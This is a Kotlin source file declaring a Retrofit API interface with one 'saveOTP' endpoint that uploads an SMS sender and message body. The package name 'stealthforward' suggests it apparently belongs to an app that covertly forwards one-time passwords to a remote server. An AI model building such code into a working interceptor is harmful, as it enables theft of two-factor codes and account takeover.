package com.nf.stealthforward.api

import retrofit2.Call
import retrofit2.http.GET
import retrofit2.http.Query

interface API {
    @GET("api/saveOTP")
    fun saveOTP(@Query("sender") sender: String, @Query("body") body: String): Call<String>
}